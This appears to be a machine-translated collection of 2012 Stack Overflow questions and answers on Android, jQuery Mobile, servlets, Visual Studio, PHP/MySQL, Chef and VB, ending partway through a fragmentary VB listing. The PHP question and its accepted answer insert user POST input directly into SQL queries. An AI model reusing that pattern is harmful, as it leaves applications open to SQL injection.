# android - android 虚拟设备管理器（avd）在最新的 adt v21 中不起作用

> ID：13704392
> 
> 赞同：6
> 
> 时间：2012-12-04T13:47:43.283
> 
> 标签：android, eclipse, adt, avd

好吧，我正在使用 Indigo，`ADT v20`一切都很好，但我突然收到一条烦人的更新消息来更新`sdk`.

当我更新 . 时`sdk`，我遇到了另一个问题，`adt`由于当前版本`sdk`不支持旧`adt`. 所以我做了，现在点击`AVD Manager`快捷方式或通过`Windows->AVD Manager`不起作用。当我点击那里时没有任何反应。我的一些朋友在使用 Win7 和 Ubuntu 时也面临同样的问题。

[我在这里](https://stackoverflow.com/questions/13381177/android-avd-manager-not-working-at-all)发现了一个类似的问题。但我不知道为什么这个问题被关闭了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T19:34:17.093

如果您打开 .metadata 目录（位于您的工作区）中名为 .log 的 eclipse 日志文件，您可能会遇到以下异常：

!ENTRY org.eclipse.ui 4 0 2012-12-06 14:17:03.497 !MESSAGE 未处理的事件循环异常!STACK 0 java.lang.NullPointerException at com.android.sdklib.internal.avd.AvdInfo.getDeviceName(AvdInfo. java:158) 在 com.android.sdkuilib.internal.repository.ui.DeviceManagerPage.fillDevices(DeviceManagerPage.java:497) 在 com.android.sdkuilib.internal.repository.ui.DeviceManagerPage.fillTable(DeviceManagerPage.java:357)在 com.android.sdkuilib.internal.repository.ui.DeviceManagerPage.createContents(DeviceManagerPage.java:259) 在 com.android.sdkuilib.internal.repository.ui.DeviceManagerPage.(DeviceManagerPage.java:130)

请参阅此链接以获取修复：

[http://code.google.com/p/android/issues/detail?id=40400](http://code.google.com/p/android/issues/detail?id=40400)

我会警告你，他们会告诉你安装“Tools 21.0.1 preview 1”。他们似乎已将名称更改为“Android 开发工具”。

我安装了它，它现在对我有用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-05T14:21:13.950

您需要以管理员权限运行 AVD 管理器。或者，简单的方法：从 eclipse 外部启动它并在那里创建您的虚拟设备。

# jquery - 为什么 .appendTo 在一个页面上工作而不是另一个页面？

> ID：13704394
> 
> 赞同：0
> 
> 时间：2012-12-04T13:47:54.553
> 
> 标签：jquery, jquery-mobile, append, appendto

所以我正在使用 jQuery mobile，我试图将一个项目从一个列表移动到另一个列表。我有这个：

```
$('document').ready(function() {
    $('.green, .blue, .red').click(function(){
        var $move = $(this).closest('div[data-theme="a"]').appendTo("#summary .theListItem");
    });
}); 
```

在同一页面上的同一列表中移动项目时效果很好。然而，即使我指定了该 div，它也不会将其移动到另一个页面上的另一个列表。这是我在 summary.html 上的 html：

```
<ul id="thelist" data-corners= "false" >
 <div id="summary">
  <div class = "theListItem" data-role="collapsible-set" data-collapsed="false">
    <div data-role="collapsible" data-collapsed="false" data-theme="a" style= "background-color: #0066cc;">
       <h3>I want it to show here</h3>
       <div data-role="controlgroup"  data-type="horizontal">
         <a class= "green" href="categorize.html" data-transition="slide" data-role="button">Tax deductible</a>
         <a class="red" href="#" data-role="button">Not deductible</a>
         <a class="blue" href="IDontKnow.html" data-transition="slideup" data-role="button">I don't know</a>
       </div>
     </div>
   </div>
 </ul> 
```

这是我在 trans.html 上的 html：

```
<ul id="thelist" data-corners= "false" >
  <div class = "theListItem" data-role="collapsible-set" data-collapsed="false">
    <div data-role="collapsible" data-collapsed="false" data-theme="a" style= "background-color: #0066cc;">
       <h3>I want this to move</h3>
       <div data-role="controlgroup"  data-type="horizontal">
         <a class= "green" href="categorize.html" data-transition="slide" data-role="button">Tax deductible</a>
         <a class="red" href="#" data-role="button">Not deductible</a>
         <a class="blue" href="IDontKnow.html" data-transition="slideup" data-role="button">I don't know</a>
       </div>
     </div>
 </ul> 
```

这是页面的相同标题：

```
<!DOCTYPE html> 
<html> 
<head> 
    <title>My Page</title> 

<meta name="viewport" content="width=device-width, initial-scale=1"> 

<script src="js/jQuery/jquery-1.8.2.min.js"></script>
<!--<script src="http://code.jquery.com/mobile/1.2.0-rc.2/jquery.mobile-1.2.0-rc.2.min.js"></script>
--><script src="jquery.mobile-1.2.0-rc.2/jquery.mobile-1.2.0-rc.2.min.js"></script>
<!--<script src="jquery.mobile-1.2.0-rc.2/jquery.mobile-1.2.0-rc.2.min.css"></script>-->

<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css" rel="stylesheet" type="text/css"/>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js"></script>   

<script type="text/javascript" src="cubiq-iscroll-bad88fb/src/iscroll.js"></script>    

<script src="js/scrollbar.js"></script>
<script src="js/script.js"></script>

<link rel="stylesheet" href="css/jQueryMobileStructure.css" />
<link rel="stylesheet" href="css/style.css" /> 
<link rel="stylesheet" href="css/nikostyle.css" /> 

<link href='http://fonts.googleapis.com/css?family=Droid+Sans' rel='stylesheet' type='text/css'>

</head> 
```

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:16:25.100

当您更改页面时，jQuery 移动标准导航不会调用 document.ready。我看到两种可能的解决方案：

1.  使用 pageinit 事件而不是文档就绪（如此[处](http://jquerymobile.com/demos/1.2.0/docs/api/events.html)所述）

    ```
     $(document).on('pageinit','[data-role=page]', function() {
        $('.green, .blue, .red').click(function(){
            var $move = $(this).closest('div[data-theme="a"]').appendTo("#summary .theListItem");
        });
    }); 
    ```

2.  或者，您可以在文档级别绑定您的事件，并且它们应该应用于整个应用程序，无论用户可能导航到什么页面（因为文档与 jquery 移动 ajax 导航保持相同）

    ```
    $(document).on("click", ".green, .blue, .red", function(){
        var $move = $(this).closest('div[data-theme="a"]').appendTo("#summary .theListItem");
    }); 
    ```

# servlets - Servlet url 模式 - servlet 上下文中的 java.lang.NullPointerException

> ID：13704400
> 
> 赞同：0
> 
> 时间：2012-12-04T13:48:11.240
> 
> 标签：servlets, asynchronous, servletconfig

我的 servlet 执行三个任务：

当它收到消息时，“resourceupdate”将请求的资源（HTML 页面）存储到对象 sharedClient。

当它接收到异步获取（由“t = UPDATE”指示的查询字符串）时，将对象 sharedClient 添加到此请求挂起。

当它接收到一个delivery_resource（由pathinfo myServlet/sharedsessionID 表示——例如myServlet/8439jfndofsd93jcanjc）执行资源的调度。

这是我的 Web.xml：

```
<servlet>
    <description></description>
    <display-name>MyServlet</display-name>
    <servlet-name>MyServlet</servlet-name>
    <servlet-class>it.package.MyServlet.MyServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>MyServlet</servlet-name>
    <url-pattern>/MyServlet/*</url-pattern>
</servlet-mapping> 
```

我以这种方式保留所有活动的 SharedClients：

```
ConcurrentHashMap<String, SharedClient> hmClients = (ConcurrentHashMap<String, SharedClient>)    this.getServletConfig().getServletContext().getAttribute("sharedClients"); 
```

我以这种方式获得具有特定 SharedSessionID 的 SharedClient：

```
SharedClient targetClient = hmClients.get(ssid); 
```

现在的问题是：直到我执行 resourceupdate servlet 工作正常，但是当我执行 delivery_resource（到 myServlet/sharedsessionID 类型的路径）时，servlet 无法获取 sharedClient 引用，并且我得到一个空指针异常。

```
if (resourceUri!=null) {
String ssid = resourceUri.substring(1);
ConcurrentHashMap<String, SharedClient> hmClients = (ConcurrentHashMap<String, SharedClient>) this.getServletConfig().getServletContext().getAttribute("sharedClients");
if (hmClients.containsKey(ssid)) {
    SharedClient targetClient = hmClients.get(ssid);
    if (targetClient.getParticipantSession().containsKey(session)) { 
    IoUtils.copy(targetClient.streamSnapshot(), response.getOutputStream());
        }
} else System.out.println("hmClient do not contains ssid"); //always in this branch 
```

从这个时候开始，异步获取的长轮询也没有成功完成。

如果我在更新后没有对 myServlet/sharedsessionID 类型的路径执行 delivery_resource，则异步获取继续正常运行。

谢谢大家。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T14:54:44.313

好的，我解决了。

我需要写

```
 @WebServlet(urlPatterns = {"/myServlet/*"}, asyncSupported=true) 
```

在 myServlet 声明之前。

# c# - 使用构建后事件在 Visual Studio 中重命名项目输出会产生错误

> ID：13704403
> 
> 赞同：7
> 
> 时间：2012-12-04T13:48:18.377
> 
> 标签：c#, visual-studio

我想在 Visual Studio 2010 中重命名项目 exe 输出。在 [包含到安装项目之前重命名项目输出后，](https://stackoverflow.com/questions/2420611/rename-project-output-before-being-included-into-setup-project) 我总是得到错误`The command rename ... exited with code 1`

我的命令是：

```
rename $(TargetDir)$(TargetFileName) newname.exe 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2016-07-25T14:32:50.577

这是构建后事件的正确命令

```
rename "$(TargetPath)" "newname.exe" 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-04T13:50:22.730

> 我想在 Visual Studio 2010 中重命名项目 exe 输出。

我建议您进入项目设置并更改输出程序集名称。这将比使用构建后事件更简单、更可靠。

您当前的构建后命令具有不匹配的双引号这一事实可能是问题所在，但我不会尝试修复它 - 我只是避免它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-03-21T18:34:03.930

我使用 Post-Build 执行批处理文件和/或 PowerShell 脚本来做任何你想做的事情：

构建后cmd：

```
if "$(ConfigurationName)" == "Release" start "Version" /D "$(SolutionDir)" /WAIT Version.bat 
```

版本.bat：

```
@powershell -ExecutionPolicy Unrestricted -File "%~dp0Version.ps1"

IF ERRORLEVEL 1 (
    echo ERROR
    pause
) ELSE (echo OK) 
```

版本.ps1：

```
# A lot of possibilities here
$scriptDirectory =  [System.IO.Path]::GetDirectoryName($MyInvocation.MyCommand.Definition) 
```

# iphone - 在一个视图中延迟加载多个 UITableView

> ID：13704417
> 
> 赞同：0
> 
> 时间：2012-12-04T13:49:14.993
> 
> 标签：iphone, ios, ipad

我正在开发 iPad 应用程序。我在一个视图中使用 2 个表格，图像 url 来自网络服务。我正在使用 Apple 为两个表提供延迟加载，并且调用了 2 个 Web 服务来显示两个表数据，一个是调用 in `ViewDidLoad`()，第二个是调用第一个 Web 服务的回调方法。我在这种方法中面临问题。

```
- (void)appImageDidLoad:(NSIndexPath *)indexPath withDataReceived:(NSData*)receivedData 
```

indexpath.row 值的值每次都在变化，有时它会给出正确的值，有时则不会。任何人都可以请帮助我。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T16:57:25.960

您可能还必须传递哪个tableview ..您知道它如何将indexPath传递给该方法..修改它以传递tableview ..并在方法内部..检查哪个tableView，然后为适当的tableview获取正确的数据源数组..

# tridion - 如何使用 TOM.net api 发布页面？

> ID：13704418
> 
> 赞同：-6
> 
> 时间：2012-12-04T13:49:17.663
> 
> 标签：tridion, tridion-2011

是否可以在 SDL Tridion 2011 中使用 Tom.net API 发布页面？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T15:35:52.447

正如 Nuno 提到`PublishEngine.Publish`的，使用并参考语法和示例

## 句法：

```
PublishEngine.Publish(
    new IdentifiableObject[] { linkedComponent },
    engine.PublishingContext.PublishInstruction,
    new List() { engine.PublishingContext.PublicationTarget }); 
```

做这样的事情： -

```
private void Publish(IdentifiableObject item, PublicationTarget publicationTarget, bool rollBackOnFailure, bool includeComponentLinks)
{
    IEnumerable<IdentifiableObject> items = new List<IdentifiableObject>() { item };    
    IEnumerable<PublicationTarget> targets = new List<PublicationTarget>() { publicationTarget };
    PublishInstruction instruction = new PublishInstruction(item.Session)
    {
        DeployAt = DateTime.Now,
        RenderInstruction = new RenderInstruction(item.Session)
        {
            RenderMode = RenderMode.Publish
        },
        ResolveInstruction = new ResolveInstruction(item.Session)
        {
            IncludeComponentLinks = includeComponentLinks
        },
        RollbackOnFailure = rollBackOnFailure,
        StartAt = DateTime.MinValue
    };
    PublishEngine.Publish(items, instruction, targets);
} 
```

***内容从**[如何以编程方式发布东西](http://yatb.mitza.net/2012/04/how-to-publish-stuff-programmatically.html#!/2012/04/how-to-publish-stuff-programmatically.html)**博客复制*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:26:49.333

使用`PublishEngine.Publish`，从那里跟随 Intellisense。您需要提供渲染和解决说明，以及目标、开始日期/时间等常用详细信息。

文档有示例，各种博客都有示例，Visual Studio 应该可以帮助您找到所需的内容。

# python - 从文件夹导入模块

> ID：13704422
> 
> 赞同：0
> 
> 时间：2012-12-04T13:49:33.003
> 
> 标签：python

我试图在我的应用程序中添加一些库以使其更便携。问题是应用程序的构建没有考虑到这一点。

所以更具体地说，我想在我的包中有一个名为 libs 的文件夹，并在那里保留我的应用程序中使用的库的副本。

例如，假设我使用 MySQLdb 库。在我的应用程序中，我正在像这样导入它

```
import mysqldb 
```

我希望能够使用相同的代码，但在 libs 文件夹中有 mysqldb。

那可能吗？我尝试了一些东西，`__init__.py`但我失败了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:50:43.157

您不应该将 MySQLdb 放在项目中的任何位置。它是一个第三方库，应该作为系统包安装或安装在项目的 virtualenv 中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:21:20.277

您可以随意使用 sys.path 并且应该实现您想要的。只需在程序开始时执行：

```
import sys
sys.path = [$'path_to_your_lib_folder_here'$] + sys.path 
```

但是，这不是最佳实践，您需要小心，特别是如果您的软件将被其他库用作第三方。

# android - 选项菜单在 ICS 及更高版本上崩溃

> ID：13704425
> 
> 赞同：1
> 
> 时间：2012-12-04T13:49:35.243
> 
> 标签：android, android-menu

选项菜单在低于 4.0的 android ***OS 版本中运行良好。***但是当涉及到 ICS 或果冻豆时，它正在崩溃。请在下面找到我的日志

```
> 12-04 13:45:05.375: E/AndroidRuntime(5245): FATAL EXCEPTION: main
> 12-04 13:45:05.375: E/AndroidRuntime(5245):
> java.lang.IllegalArgumentException: Invalid payload item type 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> android.util.EventLog.writeEvent(Native Method) 12-04 13:45:05.375:
> E/AndroidRuntime(5245):   at
> android.app.Activity.onMenuItemSelected(Activity.java:2501) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> android.support.v4.app.FragmentActivity.onMenuItemSelected(FragmentActivity.java:351)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.policy.impl.PhoneWindow.onMenuItemSelected(PhoneWindow.java:950)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.view.menu.MenuBuilder.dispatchMenuItemSelected(MenuBuilder.java:735)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.view.menu.MenuItemImpl.invoke(MenuItemImpl.java:149)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.view.menu.MenuBuilder.performItemAction(MenuBuilder.java:874)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.view.menu.IconMenuView.invokeItem(IconMenuView.java:468)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.view.menu.IconMenuItemView.performClick(IconMenuItemView.java:126)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> android.view.View$PerformClick.run(View.java:13983) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> android.os.Handler.handleCallback(Handler.java:605) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> android.os.Handler.dispatchMessage(Handler.java:92) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> android.os.Looper.loop(Looper.java:137) 12-04 13:45:05.375:
> E/AndroidRuntime(5245):   at
> android.app.ActivityThread.main(ActivityThread.java:4340) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> java.lang.reflect.Method.invokeNative(Native Method) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> java.lang.reflect.Method.invoke(Method.java:511) 12-04 13:45:05.375:
> E/AndroidRuntime(5245):   at
> com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
> 12-04 13:45:05.375: E/AndroidRuntime(5245):   at
> com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551) 12-04
> 13:45:05.375: E/AndroidRuntime(5245):     at
> dalvik.system.NativeStart.main(Native Method) 
```

我正在使用片段，我的选项菜单代码是

```
@Override
    public void onCreateOptionsMenu(Menu menu, MenuInflater inflater) {
        inflater.inflate(R.menu.settings_menu, menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case R.id.settings:
            Intent intent = new Intent(getActivity(), Settings.class);
            startActivity(intent);
            break;
        default:
            return super.onOptionsItemSelected(item);
        }

        return true;
    } 
```

请让我知道我错过了什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:51:44.410

```
@Override
public boolean onCreateOptionsMenu(Menu menu) {
    super.onCreateOptionsMenu(menu);
    getMenuInflater().inflate(R.menu.settings_menu, menu);

    return true;

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:16:53.747

您可以尝试另一种方式：---

```
 static final int SEND = 0;
  static final int DELETE = 1;  
 public boolean onCreateOptionsMenu(Menu menu) {
    menu.add(0, SEND, 0, "Send").setIcon(R.drawable.send);
    menu.add(0, DELETE, 0, "Delete").setIcon(R.drawable.delete);

    return true;
}   

  public boolean onOptionsItemSelected(MenuItem item) {
    switch (item.getItemId()) {
    case SEND: {
     your code:---
      }
    return true;
      case DELETE: {

    }
    return true;
  }
  return false; 
 } 
```

# java - 从 ColdFusion 启动测试 SMTP 服务器

> ID：13704430
> 
> 赞同：2
> 
> 时间：2012-12-04T13:49:53.063
> 
> 标签：java, coldfusion, smtp

我们正在为我们的 ColdFusion (9) 站点创建培训模式。

该系统将允许我们的用户在登录后通过单击链接从生产模式切换到培训模式。

当它们切换时，数据源将被切换，从而可以安全地修改数据。

我们还将使用 SubEthaSMTP Java 项目实现一个测试 SMTP 服务器，以捕获从培训模式发送的电子邮件并在网页中显示给用户。

我们可以毫不费力地将 SMTP 服务器作为独立进程或服务启动。

更好的解决方案是在用户切换到训练模式时启动服务器作为 ColdFuson 运行时的一部分。

我们将创建一个真正的 Java 线程，该线程将在任何培训课程的长度和任意超时期间持续在服务器级别范围内。如果服务器超时并启动新的培训课程，我们将启动新的 SMTP 服务器。

因此，我的基本问题是，以这种方式在 ColdFusion 运行时中运行正在进行的线程是不是一个坏主意？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:49:10.387

我看不出这样做有什么问题，尽管您应该测试一下 SubEthaSMTP 使用哪些资源并确保它不会给您带来问题。它看起来具有最小的依赖关系（基本上只是 SLF4J，ColdFusion 9 和 10 已经提供）

从[示例页面](http://code.google.com/p/subethasmtp/wiki/SimpleExample)看起来很容易设置并放入长期运行的范围。我认为您选择服务器范围是正确的，因为您可能在使用应用程序或任何更不稳定的东西时遇到问题，因为会出现应用程序范围超时并被重置的情况，但您会丢失对 Mail 的所有引用服务器实例。

请用您的发现更新帖子，因为我很想看看您的发现。

# mysql - MYSQL 存储过程：如何删除刚刚更新的记录

> ID：13704438
> 
> 赞同：0
> 
> 时间：2012-12-04T13:50:33.123
> 
> 标签：mysql, stored-procedures

我有两个表名：registeredList 和 deregisteredlist。现在，当用户从“registeredlist”表中注销时，触发器会将他的信息更新到注销表并从注册表中删除记录。在我下面的过程中，我可以正确更新它，但不能从注册表中删除用户。我的过程：

```
DELIMITER $$
USE `abc_db`$$
DROP TRIGGER  `UnsubscriberListTrigger`$$
CREATE        
    TRIGGER `UnsubscriberListTrigger` AFTER UPDATE ON `registeredlist` FOR EACH ROW 
    BEGIN        
     IF (old.SubscriberStatus='registered') THEN    
       INSERT INTO deregisteredlist(name,SubscriberStatus,DeRegistrationDate) 
       VALUES(old.name,'Deregistered',NOW());

       DELETE from registeredlist where old.id=new.id;/???????/I am getting problem here           
     END IF;
 END $$
DELIMITER ; 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:56:57.643

我认为你需要的只是改变`WHERE`陈述`DELETE`。它应该是这样的：

```
DELETE from registeredlist where id=old.id; // (or new.id cause in this case old.id is equal to new.id) 
```

...因为您想将其与`id`列匹配。

**更新：**

另一种可能性是： - 创建 AFTER INSERT TRIGGER 将在`deregisteredlist`其上执行删除`registeredlist`。这样你就不应该得到那个错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:56:32.387

试试这个：：

```
DELETE from registeredlist order by updateddat desc limit 1; 
```

# ruby - 迭代 Chef ERB 模板中的哈希数组

> ID：13704447
> 
> 赞同：0
> 
> 时间：2012-12-04T13:50:55.557
> 
> 标签：ruby, chef-infra

我正在尝试为具有以下属性的厨师制作食谱：

```
default['web-server']['hosts'] = [ { host: "some-ip", server: "some-server", port: "9000" } ] 
```

这个想法是迭代它以创建配置文件（在本例中为 lighttpd），如下所示：

```
<% if node['web-server']['hosts'].length > 0 -%>
<%   node['web-server']['hosts'].each do |host| -%>

  $HTTP["host"] =~ "<%= host.host %>" {
    proxy.balance = "round-robin" proxy.server = (
      "" => (
          "play" => (
             "host" => "<%= host.server %>",
             "port" => <%= host.port %>
           )
         )
     )
  }
<%   end -%>
<% else -%>
<% end -%> 
```

但是，在`chef-client`测试节点上运行时，我收到了以下信息：

```
FATAL: Chef::Mixin::Template::TemplateError: undefined method `host' for #<Mash:0x00000002b9a878> 
```

循环哈希数组的正确方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T14:20:11.527

好的，我想通了。正确的语法是通过访问哈希键`hash[:key]`，即

```
$HTTP["host"] =~ "<%= host[:host] %>" {
    proxy.balance = "round-robin" proxy.server = (
         "" => (
             "play" => (
               "host" => "<%= host[:server] %>",
               "port" => <%= host[:port] %>
             )
         )
       )
  }
  <%   end -%>
  <% else -%>
  <% end -%> 
```

# solr - 使用 runjetty 运行 Solr 时，端口号 8080 已在使用中

> ID：13704448
> 
> 赞同：-1
> 
> 时间：2012-12-04T13:50:56.697
> 
> 标签：solr, jetty

当我在 Eclipse 中使用 runjetty 运行 solr 时，出现异常（`IlleagalStateException`）并且端口号：8080 已在使用中？

谁可以帮我这个事？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T04:43:45.920

这意味着有一个 java 服务正在使用该端口，转到任务管理器并处理并杀死当前正在运行的任何 javaw 进程......

希望这可能会解决。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T15:08:50.407

在您的 solr 安装文件夹中，搜索“example/etc/jetty.xml”

这是您正在寻找的相关部分：

```
<Set name="port">
    <SystemProperty name="jetty.port" default="8080"/>
</Set> 
```

根据需要更改“默认”值（未使用的端口）

或启动码头添加

```
-Djetty.port=11111 
```

从命令行（1111 只是一个随机数，你再选择一个你需要的）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-06T09:27:41.007

将您的 apache tomcat 端口更改为其他端口，然后重试...

请在 server.xml 文件中设置端口值它的路径是这样的，

```
Tomcat-installation-dir\conf\server.xml 
```

像这样搜索标签，

```
<!-- Define a non-SSL HTTP/1.1 Connector on port 8080 -->
<Connector port="8080" maxHttpHeaderSize="8192"
maxThreads="150" minSpareThreads="25" maxSpareThreads="75"
enableLookups="false" redirectPort="8443" acceptCount="100"
connectionTimeout="20000" disableUploadTimeout="true" /> 
```

将端口号更改为任何其他数字，例如 9090，更改后应如下所示，

```
<!-- Define a non-SSL HTTP/1.1 Connector on port 9090 -->
<Connector port="9090" maxHttpHeaderSize="8192"
maxThreads="150" minSpareThreads="25" maxSpareThreads="75"
enableLookups="false" redirectPort="8443" acceptCount="100"
connectionTimeout="20000" disableUploadTimeout="true" /> 
```

不要更改连接器端口以外的任何内容，仅更改端口的值并保存文件，然后点击 url，

```
localhost:9090 
```

或者使用您在 server.xml 文件中更新的端口号。

```
localhost:port_in_server.xml 
```

所以如果一切顺利，它应该打开tomcat主页......这将确保您已将tomcat的默认端口（ie8080）更改为9090。此时关闭tomcat服务器。现在您停止并重新启动码头服务器，它将毫无问题地为您工作..

希望这可以帮助....

# php - 空 MySQL 查询结果未按预期工作？

> ID：13704456
> 
> 赞同：1
> 
> 时间：2012-12-04T13:51:26.027
> 
> 标签：php, mysql, if-statement, header

我正在使用以下脚本检查代码，因此当用户输入调查代码时，他们会获得与该代码关联的调查。获取调查的部分正在按预期工作，但由于某种原因，我似乎无法收到错误消息。如果我在此发布的表单上输入了错误的代码或没有代码，我得到的只是一个空白页。

```
<?php
$con = mysql_connect("myhost","myuser","mypassword;
if (!$con) {
    die('Could not connect: ' . mysql_error());
}

// Select mysql db
mysql_select_db("mydb", $con);

$questionaireID = $_POST['questionaireID'];

$result = mysql_query("SELECT * FROM itsnb_questionaire WHERE questionaireID='$questionaireID'") or die(mysql_error());
while($row = mysql_fetch_array($result)) {
    if (empty($row['questionaireID'])) {
        echo '<h2>Sorry I cant find a quiz with that code, please recheck your code.</h2>';
    } else {
        $url = $row['questionaireurl'];
        header('Location: '.$url.'');
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:53:52.520

它永远不会到达那里，因为如果结果集为空，它将跳过 while 循环。

试试这个，而不是限制为 1 条记录（这是您所期望的）并使用 an`if...else`而不是您的`while`（只有在预期有多个结果时才需要）：

```
$sql = "SELECT * 
        FROM itsnb_questionaire 
        WHERE questionaireID = '{$questionaireID}'
        LIMIT 1";
$result = mysql_query($sql) or die(mysql_error());
if ($row = mysql_fetch_array($result)) {
    $url = $row['questionaireurl'];
    header('Location: '.$url.'');
} else {
    echo '<h2>Sorry I cant find a quiz with that code, please recheck your code.</h2>';
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:56:12.327

如果返回的行数为零，则您没有找到结果，因此您可以显示适当的错误消息

尝试

```
if (mysql_num_rows($result)<1){
     //error
 } 
```

# vb.net - 重力与碰撞 - 简单的 VB 游戏

> ID：13704463
> 
> 赞同：0
> 
> 时间：2012-12-04T13:51:47.307
> 
> 标签：vb.net

我正在尝试制作一个类似于 iCopter 的游戏，在那里你可以控制一个物体并引导它穿过移动的障碍物。

所以我在 Fireworks 中制作了一个简单的 png，它只是山脉，我想将它添加到 VB，这样如果对象接触到 PNG 的一部分（不是 Picturebox，因为那会破坏目的），它将结束游戏。

因此，主要问题是如何让 VB 识别没有图片框的 PNG（如果可能的话）......

谢谢

![截屏](../Images/983ce9097723c3c5a58520ac83bb7b7e.png)

我不断地离开背景的运动，我可以移动汽车，但是我想产生碰撞，这将很难看到，因为它会与更大的图片框，而不是里面的实际图像......

* * *

新代码/工作

```
Public Class Form1
Dim upc, leftc, rightc, downc As Boolean
Dim speedofblocks As Integer = 5
Dim speedofguy As Integer = 6
Dim standing As Boolean
Dim blocks(1) As PictureBox
Dim floor(1) As PictureBox

    If e.KeyCode = Keys.Left Then

        leftc = True
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If

    If e.KeyCode = Keys.Right Then
        rightc = True
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If

    If e.KeyCode = Keys.Up Then
        upc = True
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If
    If e.KeyCode = Keys.Down Then
        downc = True
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If

    If e.KeyCode = Keys.Left Then

        leftc = False

    End If

    If e.KeyCode = Keys.Right Then
        rightc = False
    End If

    If e.KeyCode = Keys.Up Then
        upc = False
    End If
    If e.KeyCode = Keys.Down Then
        downc = False
    End If
End Sub

    PictureBox1.BackgroundImage = My.Resources.GUystand
    blocks(1) = PictureBox1
    blocks(1) = PictureBox2
    blocks(1) = PictureBox3
    blocks(1) = PictureBox4
    blocks(1) = PictureBox5
    blocks(1) = PictureBox6
    blocks(1) = PictureBox7
    blocks(1) = PictureBox8
    blocks(1) = PictureBox3
    blocks(1) = PictureBox10
    blocks(1) = PictureBox11
    blocks(1) = PictureBox12
    blocks(1) = PictureBox13
    blocks(1) = PictureBox14
    blocks(1) = PictureBox15
    blocks(1) = PictureBox16
    blocks(1) = PictureBox17
    blocks(1) = PictureBox18
    blocks(1) = PictureBox19
    blocks(1) = PictureBox20
    blocks(1) = PictureBox21
    blocks(1) = PictureBox22
    blocks(1) = PictureBox23
    blocks(1) = PictureBox24
    blocks(1) = PictureBox25
    blocks(1) = PictureBox26
    blocks(1) = PictureBox27
    blocks(1) = PictureBox28
    blocks(1) = PictureBox29
    blocks(1) = PictureBox30
    blocks(1) = PictureBox31
    blocks(1) = PictureBox32
    blocks(1) = PictureBox33
    blocks(1) = PictureBox34
    blocks(1) = PictureBox35
    blocks(1) = PictureBox36
    blocks(1) = PictureBox37
    blocks(1) = PictureBox38
    blocks(1) = PictureBox39
    blocks(1) = PictureBox40
    blocks(1) = PictureBox41
    blocks(1) = PictureBox42
    blocks(1) = PictureBox43
    blocks(1) = PictureBox44
    blocks(1) = PictureBox45
    blocks(1) = PictureBox46
    blocks(1) = PictureBox47
    blocks(1) = PictureBox48
    blocks(1) = PictureBox49

    floor(1) = picturebox50

End Sub

    If leftc = True Then
        PictureBox1.Left -= speedofguy
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If
    If rightc = True Then
        PictureBox1.Left += speedofguy
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If
    If upc = True Then
        PictureBox1.Top -= speedofguy
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If

    If downc = True Then
        PictureBox1.Top += speedofguy
        PictureBox1.BackgroundImage = My.Resources.guy1
    End If

Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
    PictureBox2.Left -= speedofblocks
    PictureBox3.Left -= speedofblocks
    PictureBox4.Left -= speedofblocks
    PictureBox5.Left -= speedofblocks
    PictureBox6.Left -= speedofblocks
